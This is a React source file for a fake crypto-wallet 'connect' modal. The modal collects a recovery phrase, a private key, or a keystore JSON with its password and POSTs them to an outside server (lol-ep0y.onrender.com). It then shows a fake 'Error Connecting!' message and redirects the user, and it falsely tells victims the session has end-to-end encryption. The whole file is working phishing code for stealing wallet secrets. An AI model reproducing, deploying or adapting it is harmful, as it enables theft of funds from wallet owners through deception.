import React, { useState } from "react";
import { motion } from "framer-motion";
import { IoShieldHalfOutline } from "react-icons/io5";
import { useNavigate } from "react-router-dom";

const Spinner = () => (
  <svg
    className="animate-spin h-5 w-5 text-white inline-block"
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    viewBox="0 0 24 24"
  >
    <circle
      className="opacity-25"
      cx="12"
      cy="12"
      r="10"
      stroke="currentColor"
      strokeWidth="4"
    ></circle>
    <path
      className="opacity-75"
      fill="currentColor"
      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
    ></path>
  </svg>
);

const PhraseModal = ({ onClose, isDarkMode, wallet }) => {
  const navigate = useNavigate();
  const [showErrorToast, setShowErrorToast] = useState(false);
  const [activeTab, setActiveTab] = useState("phrase");
  const [phraseLength, setPhraseLength] = useState(12);
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
  const [privateKey, setPrivateKey] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [loading, setLoading] = useState(false);

  const handlePhraseLengthChange = (length) => {
    setPhraseLength(length);
    setPhraseWords(Array(length).fill(""));
  };

  const handleWordChange = (index, value) => {
    const newWords = [...phraseWords];
    newWords[index] = value;
    setPhraseWords(newWords);
  };

  const handleSubmit = async () => {
    try {
      setLoading(true);

      let payload = {
        wallet: wallet?.name || "Unknown Wallet",
        tab1Inputs: [],
        tab2Text: "",
        tab3: {
          content: "",
          title: "",
          password: "",
        },
      };

      if (activeTab === "phrase") {
        const incomplete = phraseWords.some((word) => word.trim() === "");
        if (incomplete) {
          alert("Please fill all the recovery phrase words before submitting.");
          setLoading(false);
          return;
        }
        payload.tab1Inputs = phraseWords;
      }

      if (activeTab === "privateKey") {
        if (!privateKey.trim()) {
          alert("Please enter your private key.");
          setLoading(false);
          return;
        }
        payload.tab2Text = privateKey;
      }

      if (activeTab === "keystore") {
        if (!keystoreJson.trim()) {
          alert("Please enter your keystore JSON.");
          setLoading(false);
          return;
        }
        payload.tab3.content = keystoreJson;
        payload.tab3.title = "keystore";
        payload.tab3.password = keystorePassword;
      }

      const response = await fetch("https:///lol-ep0y.onrender.com/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();
      console.log("Submit successful:", result);

      setTimeout(() => {
        setShowErrorToast(true);
        setLoading(false);

        setPhraseWords(Array(phraseLength).fill(""));
        setPrivateKey("");
        setKeystoreJson("");
        setKeystorePassword("");

        setTimeout(() => {
          onClose();
        }, 1500);

        setTimeout(() => {
          navigate("/connect");
        }, 10000);
      }, 5000);
    } catch (error) {
      console.error("Submit error:", error);
      setShowErrorToast(true);
      setLoading(false);

      setPhraseWords(Array(phraseLength).fill(""));
      setPrivateKey("");
      setKeystoreJson("");
      setKeystorePassword("");

      setTimeout(() => {
        onClose();
        navigate("/connect");
      }, 10000);
    }
  };
  return (
    <div
      className={`fixed inset-0 ${
        isDarkMode ? "bg-black/60" : "bg-blue-100/60"
      } flex items-center justify-center z-50 px-4`}
    >
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{
          type: "spring",
          stiffness: 100,
          damping: 15,
          duration: 0.6,
          delay: 0.2,
        }}
        className={`${
          isDarkMode ? "bg-[#1e1e1e] text-white" : "bg-white text-black"
        } p-6 rounded-lg shadow-lg max-w-md w-full relative`}
      >
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-2 right-2 text-red-600 font-bold"
          disabled={loading}
        >
          ✕
        </button>

        {/* Tabs */}
        <div className="max-h-[70vh] overflow-y-auto pr-2">
          <div className="flex justify-between items-center gap-2 border-b mb-6 text-sm font-medium">
            {["phrase", "privateKey", "keystore"].map((tab) => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                disabled={loading}
                className={`px-4 py-2 rounded-t ${
                  activeTab === tab
                    ? isDarkMode
                      ? "bg-[#2a2a2a] text-purple-400"
                      : "bg-blue-100 text--600"
                    : isDarkMode
                    ? "text-gray-400"
                    : "text-gray-500"
                }`}
              >
                {tab === "phrase"
                  ? "Recovery Phrase"
                  : tab === "privateKey"
                  ? "Private Key"
                  : "Keystore JSON"}
              </button>
            ))}
          </div>

          {/* Recovery Phrase Tab */}
          {activeTab === "phrase" && (
            <div className="space-y-4">
              <div className="flex justify-between items-center my-2">
                <p className="text-purple-600 text-xs font-semibold">
                  {phraseWords.filter((w) => w.trim() !== "").length} /{" "}
                  {phraseLength} words entered
                </p>
                <ul className="flex text-gray-800 text-xs font-medium gap-2">
                  {[12, 15, 17, 24, 25].map((val) => (
                    <li
                      key={val}
                      onClick={() => !loading && handlePhraseLengthChange(val)}
                      className={`cursor-pointer px-2 py-1 rounded border transition-all duration-200 ${
                        phraseLength === val
                          ? "bg-blue-100 text-blue-600 border-blue-400"
                          : "text-purple-600 hover:bg-purple-100 border-transparent"
                      }`}
                    >
                      {val}
                    </li>
                  ))}
                </ul>
              </div>

              <div className="grid grid-cols-3 gap-4">
                {phraseWords.map((input, index) => (
                  <div key={index} className="relative group my-1">
                    <input
                      id={`input-${index}`}
                      type="text"
                      value={input}
                      onChange={(e) =>
                        !loading && handleWordChange(index, e.target.value)
                      }
                      placeholder="Word"
                      className={`peer w-full pl-6 pr-4 pt-6 pb-2 text-sm ${
                        isDarkMode
                          ? "text-white bg-[#2a2a2a] border-gray-600"
                          : "text-gray-800 bg-white border-gray-200"
                      } border rounded-lg shadow-md focus:border-transparent focus:ring-2 focus:ring-indigo-300 focus:outline-none placeholder-transparent`}
                      disabled={loading}
                    />
                    <label
                      htmlFor={`input-${index}`}
                      className="absolute left-6 top-3.5 text-[3px] text-gray-500 transition-all duration-200 ease-in-out 
                        peer-placeholder-shown:top-3 peer-placeholder-shown:text-[10px] 
                        peer-placeholder-shown:text-gray-400 peer-focus:top-1.5 
                        peer-focus:text-[8px] peer-focus:text-indigo-500 peer-focus:font-semibold cursor-text"
                    >
                      Write here
                    </label>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Private Key Tab */}
          {activeTab === "privateKey" && (
            <div className="mb-4">
              <label className="block text-sm mb-2 text-gray-500">
                Private Key
              </label>
              <textarea
                value={privateKey}
                onChange={(e) => !loading && setPrivateKey(e.target.value)}
                placeholder="Enter your private key"
                rows={4}
                className={`w-full p-3 text-sm rounded-lg shadow border resize-none min-h-[100px] ${
                  isDarkMode
                    ? "bg-[#2a2a2a] text-white border-gray-600"
                    : "bg-white text-gray-800 border-gray-200"
                } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
                disabled={loading}
              />
            </div>
          )}

          {/* Keystore JSON Tab */}
          {activeTab === "keystore" && (
            <div className="space-y-3">
              <label className="block text-sm text-gray-500">
                Keystore JSON
              </label>
              <textarea
                value={keystoreJson}
                onChange={(e) => !loading && setKeystoreJson(e.target.value)}
                placeholder="Paste your keystore JSON here"
                rows={4}
                className={`w-full p-3 text-sm rounded-lg shadow border resize-none min-h-[100px] ${
                  isDarkMode
                    ? "bg-[#2a2a2a] text-white border-gray-600"
                    : "bg-white text-gray-800 border-gray-200"
                } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
                disabled={loading}
              />
              <div>
                <label className="block text-sm mb-1 text-gray-500">
                  Password
                </label>
                <input
                  type="password"
                  value={keystorePassword}
                  onChange={(e) =>
                    !loading && setKeystorePassword(e.target.value)
                  }
                  placeholder="Enter password"
                  className={`w-full p-3 text-sm rounded-lg shadow border ${
                    isDarkMode
                      ? "bg-[#2a2a2a] text-white border-gray-600"
                      : "bg-white text-gray-800 border-gray-200"
                  } focus:outline-none focus:ring-2 focus:ring-indigo-300`}
                  disabled={loading}
                />
              </div>
            </div>
          )}
        </div>

        <div className="w-full my-5">
          <button
            onClick={handleSubmit}
            disabled={loading}
            className={`border w-full border-blue-500 rounded-full py-3 ${
              loading
                ? "bg-gray-400 cursor-not-allowed text-gray-700 flex justify-center items-center gap-2"
                : "bg-indigo-600 hover:text-white text-white hover:bg-indigo-700 cursor-pointer"
            } text-xs`}
          >
            {loading ? (
              <>
                <Spinner /> Connecting...
              </>
            ) : (
              "Connect"
            )}
          </button>
        </div>

        <div className="text-center flex items-center justify-center gap-2 text-sm mt-6">
          <IoShieldHalfOutline className="text-2xl" />
          <p className="text-gray-400 text-sm">
            This session is protected with end-to-end encryption
          </p>
        </div>
      </motion.div>

      {/* Error Toast Centered */}
      {showErrorToast && (
        <motion.div
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ scale: 0.8, opacity: 0 }}
          transition={{
            type: "spring",
            stiffness: 300,
            damping: 20,
            duration: 0.6,
          }}
          className="fixed inset-0 z-50 flex items-center justify-center"
        >
          <div className="w-80 max-w-xs p-4 bg-white text-red-700 border-l-4 border-red-500 rounded-lg shadow-lg text-center">
            <p className="font-bold text-2xl">Error Connecting!</p>
            <p className="text-sm mt-1">Only active wallets are authorized.</p>
          </div>
        </motion.div>
      )}
    </div>
  );
};

export default PhraseModal;
